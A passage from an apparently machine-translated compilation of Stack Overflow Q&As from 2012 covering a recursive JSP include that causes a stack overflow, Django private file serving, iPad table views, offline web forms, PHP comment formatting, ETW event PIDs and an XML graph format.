at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:646)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:551)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:488)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:968)
at org.apache.jsp.index_jsp._jspService(index_jsp.java:78)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:386)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:313)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:260)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:717)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:290) 
```

引起：org.apache.catalina.core.ApplicationHttpRequest.getAttribute 的 org.apache.catalina.core.ApplicationHttpRequest.getAttribute(ApplicationHttpRequest.java:220) 的 java.lang.StackOverflowError

我是第一次在 JSP 上工作。有什么我遗漏的东西，或者有没有更简单方便的方法来实现这个场景？任何帮助将不胜感激。

谢谢，索姆纳斯

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T22:43:01.400

您将 jsp 本身包含在 jsp:include 标记中 - 因此您会遇到堆栈溢出。

如果您想根据按钮点击转发到两个不同的页面，那么您需要更简单的东西：

```
<form name="form1" action="processCreateRequest.jsp" method="post">
  <input type='hidden' name='requestType' value='create'/>
  <table border="0">
    <tr>
      <td valign="top"><h1>Create New Reservation</h1></td>
      <td><input type="submit" value="Create"></td>
    </tr>
  </table>
</form>
<form name="form2" action="processSearchRequest.jsp" method="post">
  <input type='hidden' name='requestType' value='search'/>
  <table border="0">
    <tr>
      <td valign="top"><h1>Change or Cancel Reservation</h1></td>
      <td><input type="submit" value="Search"></td>
    </tr>
  </table>
</form> 
```

当您发布到两个不同的 jsps 时，即使是隐藏的输入也是多余的

# python - 使用自定义媒体链接（不是 MEDIA_ROOT）形成 ImageField

> ID：10218833
> 
> 赞同：0
> 
> 时间：2012-04-18T22:11:47.733
> 
> 标签：python, django, django-forms, django-media

用户应将他的护照数据上传到网站。此数据是私有的，因此如果将其放置在服务器目录之外会更好。

这是一个模型：

```
passport_storage = FileSystemStorage(setting('ROOT_PATH'))

class Passport(models.Model):
    user                = models.OneToOneField(User)

    scan                = models.ImageField(verbose_name=u'Scan or photo', storage=passport_storage, upload_to='passport', blank=True)

    def preview_scan(self):
        return '<a href="%s"> <img src="%s%s/?thumb=1"></img> </a>' % (self.id, PASSPORT_URL, self.id)
    preview_scan.allow_tags = True 
```

我写了获取护照的查看方法，或者是拇指：

```
@login_required
def get_passport(request, **kwargs):
    id = kwargs.pop('id', None)
    user = request.user

    passport = Passport.objects.filter(pk=id)
    if user.username != 'admin': # говнокод
        passport = passport.filter(user=user)
    passport = passport[0]
    scan = passport.scan
    path = scan.path
    sz = scan.size

    if request.GET.get('thumb', None):
        path = get_thumb(path)
        sz = os.path.getsize(path)

    filename = os.path.basename(path)
    mt = mimetypes.guess_type(filename)[0]

    wrapper = FileWrapper(file(path))
    response = HttpResponse(wrapper, mimetype=mt)
    response['Content-Disposition'] = 'attachment; filename=%s' % filename
    response['Content-Length'] = sz

    return response 
```

但是来自 Passport 模型的 ModelForm 显示来自`/media/`. 我在哪里可以更改表单的 ImageField 链接？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T05:17:23.350

我会覆盖管理表单的小部件以使用普通上传小部件，而不是更复杂的带有链接和删除复选框的管理上传小部件。如果不可接受，您可以基于管理文件小部件编写自己的小部件，并在那里提供必要的 URL。

# ipad - 如何在通过文本字段和圆形矩形按钮提供的表格视图单元格中显示数据

> ID：10218835
> 
> 赞同：0
> 
> 时间：2012-04-18T22:11:57.577
> 
> 标签：ipad, uitableview, uibutton, uitextfield

![在此处输入图像描述](../Images/2e630bb5e6aaddd51630fd82b9e3ee7f.png)

在我的 iPad 应用程序中，单个视图上有一个文本字段、2 个圆形矩形按钮和一个表格视图。

在按下这些按钮时，会出现一个弹出窗口，用户从该弹出窗口中选择一个值，该值也将成为按钮的标题。有一个文本字段，用户可以向其中输入一些值。

我想要做的是，当用户在该文本字段中输入一些内容并通过按下这些按钮选择一些值时，所有这 3 件事都应该出现在表格视图的一个单元格上。同样，当用户再次在文本字段和按钮中输入数据时，这些数据应该出现在表格视图的第二个单元格上。

请考虑从我的项目的实际模型中截取的附加图像。

我对完成这项任务的想法很少。

任何帮助将不胜感激

谢谢和最好的问候，

个人电脑

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-18T22:26:20.187

`UITableView`您应该能够通过's[`reloadRowsAtIndexPaths: withRowAnimation:`](https://developer.apple.com/library/ios/documentation/UIKit/Reference/UITableView_Class/Reference/Reference.html#//apple_ref/occ/instm/UITableView/reloadRowsAtIndexPaths%3awithRowAnimation%3a)功能做您想做的事情。

只需确保您设置了要更新的正确单元格（在“indexPath”参数中传递），您可以更新该单元格（如果它是可见的）以反映您想要更新的数据。

# ipad - 如何实现或利用“保存 Web 表单数据”功能

> ID：10218838
> 
> 赞同：0
> 
> 时间：2012-04-18T22:12:13.943
> 
> 标签：ipad, jquery-mobile, tablet

我正在使用 jquery/html5/css3 创建一个用于我公司的 Web 表单。我们的技术人员将使用这些表格到现场填写并提交。如果没有现成的 Wi-Fi 连接，那么运行这些的最佳方式是什么，该功能还将“保存”网络表单数据，以防他们想在 Wi-Fi 可用时再次拉起表单并将其发送方法。

这个答案的解决方案可以是在 jquery 中的实现（如果可能的话）使用保存按钮来保存表单数据，或者它可以是用来完成此操作的应用程序列表。技术人员以离线模式启动我的网络应用程序并可能保存值的最佳方式是什么？

关键：使 Web 应用程序脱机，并保存表单数据

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T06:09:51.323

尝试使用[localStorage](http://paperkilledrock.com/2010/05/html5-localstorage-part-one/)和[appCache](http://www.html5rocks.com/en/mobile/workingoffthegrid/)。

我链接到的 appCache 文章解释了确定用户是在线还是离线的最佳方法。然后，您可以将表单提交到服务器或放入 localStorage 以备后用。如果您想了解更多详细信息，我可以编写一个 jsfiddle。

# php - 你能用 PHP 格式化评论吗？

> ID：10218844
> 
> 赞同：1
> 
> 时间：2012-04-18T22:12:56.953
> 
> 标签：php, comments

我希望能够在 PHP 注释中做粗体或斜体文本。有谁知道如何做到这一点？例如：

```
// I want to bold **this** 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T22:15:03.943

如果您的编辑器支持格式化，那么您无论如何都可以格式化您的评论。

但是，除非您使用 Word 来编辑代码（***非常***糟糕的主意！），否则您只能使用纯旧文本。

就个人而言，如果我需要在纯文本环境中强调文本，我会使用`/italic/`,`*bold*`和`_underline_`. 顺便说一句，我相信这些是 Word 中相同格式的快捷方式。奖金！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-18T22:21:29.763

它总是取决于您使用什么来阅读您的代码，我自己使用的是 Eclipse IDE，您可以在那里使用

```
/**
 * <div style="color: red; font-weight: heavy">Some text<br/>other line</div>
 * <strong>Now</strong> some &lt;tags&gt;
 */ 
```

但是，使用 vim 或大多数其他编辑器将是大量阅读。

### 编辑：

所以它真的就像真正的 html 一样，可以这样使用。但是，我个人不建议使用它，因为在使用 .或任何不支持 html 或 css 标记的编辑器读取相同文件时，它会破坏注释的含义`less`。`notepad`

你甚至可以这样做：

```
/**
 * <style> div { margin: 10px; padding: 20px; background-color: #cde; } </style>
 * 
 * <div>Some text<br/>with background color, margin and padding</div>
 */ 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-18T22:18:00.273

实际上，源代码是普通文本，在 PHP 世界（和大多数其他编程语言）中通常没有格式。有一些“帮手”：

*   编辑器有时会以特殊颜色突出显示特殊文本，并允许您单击`@param`标签等内容。
*   PHPDocumentor 允许您在评论中放置 HTML 标记。不是全部，而是一些。生成文档并使用浏览器浏览它时，您将看到您的格式 - 但在您编辑代码时看不到。
*   对于代码编辑，你可以做一些特殊的格式，比如`_underline_`等等——如果你喜欢的话。

# winapi - 来自 NDIS 等内核提供程序时的 ETW PID 准确性

> ID：10218855
> 
> 赞同：2
> 
> 时间：2012-04-18T22:14:00.747
> 
> 标签：winapi, windows-7, etw

我一直在玩 Windows 事件的事件跟踪，特别是网络事件，NDIS-PacketCapture 和 TCPIP。每个 ETW 消息都有 PID 字段，我试图找出分配背后的逻辑。似乎绝大多数 TCPIP 事件在 PID 字段中具有正确的 PID，并且大多数 NDIS 数据包捕获也是如此。然而，在很多情况下，可能有 30% 的 PID 显然是不正确的。这些不正确的 PID 信息中的一些是假阳性和一些假阴性。例如，它会错过来自 Chrome 的某些数据包，它只会为这种情况分配 PID 0（假阴性）。有时我会获取正在运行的应用程序的 PID，以在 PID 字段中捕获这些事件（误报）。据我分析，

另一个值得注意的有趣的事情是，一些 TCPIP 事件包含一个“PID”属性，该属性有时与标头中的 PID 一致。这个“PID”属性似乎比标头 PID 更准确，但它仍然表现出误报和误报。

我看到错误了吗？我不了解 ETW 消息中 PID 字段的用途吗？这些供应商是否只是选择在他们喜欢的时候放入垃圾？

我在 C++ 中使用 Win32/64 跟踪函数，例如 StartTrace、EnableTraceEx2、OpenTrace 和 ProcessEventRecordProperties(PEVENT_RECORD pEvent) 回调等。更具体地说，我修改了这个示例以提供 NDIS-PacketCapture 和 TCPIP 事件：[http://msdn.microsoft.com/en-us/library/windows/desktop/ee441329(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/ee441329(v=vs.85).aspx)

这是典型 TCPIP 事件的所有值的样子（我使用 xxx.. 作为 IP 和端口号）

```
------------------Processing Event Record ------------------
Event HEADER (size=136) flags=64bit, type=none
pid=7576 tid=5236 eid=1300
Time: sys=3 usr=2
Event PROVIDER {2f07e2ee-15db-40f1-90ef-9d7ba282188a}
Event ACTIVITY {0ff3b670-fa80-ffff-0000-000000000000}
Provider name: Microsoft-Windows-TCPIP

Provider GUID: {2F07E2EE-15DB-40F1-90EF-9D7BA282188A}
Event message: TCP: connection %1 (local=%3 remote=%5) exists. State = %6\. PID = %7\. 
Keyword mask: 0x8000080400000084
  Keyword name: ut:TcpipTcb
  Keyword name: ut:TcpipDiagnosis
  Keyword name: ut:ConnectPath
  Keyword name: ut:Endpoint
Event ID: 1300
Tcb: 0xff3b670
LocalAddressLength: 16
LocalAddress:
 xxx.xxx.xxx.xxx:xxxx
RemoteAddressLength: 16
RemoteAddress:
 xxx.xxx.xxx.xxx:xxxx
State: EstablishedState
Pid: 7152 
```

任何帮助是极大的赞赏。

# xml - 存储有向图的好 XML 格式是什么？

> ID：10218858
> 
> 赞同：0
> 
> 时间：2012-04-18T22:14:08.730
> 
> 标签：xml, coding-style, formatting

该图由许多顶点组成，每个顶点都有一些属性，以及两个顶点之间的有向边。

什么是存储此类的好的 XML 格式？

```
<graph>
  <vertices>
    <vertex>
      <name>foobar</name>
      <vertexproperties>
        <vertexproperty>
          <name>p1</name>
          <value>v1</value>
        </vertexproperty>
